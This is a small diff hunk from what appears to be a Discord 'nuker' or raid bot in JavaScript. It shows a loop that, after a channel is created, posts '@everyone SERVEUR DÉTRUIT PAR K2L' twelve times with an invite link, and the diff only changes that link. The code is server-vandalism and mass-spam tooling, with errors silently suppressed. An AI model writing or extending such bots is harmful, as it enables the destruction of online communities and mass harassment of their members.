@@ -532,7 +532,7 @@ client.on('messageCreate', async message => {
                         }]
                     }).then(channel => {
                         for (let j = 0; j < 12; j++) {
-                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
+                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/kyuro').catch(() => {});
                         }
                     }).catch(() => {});
                 }
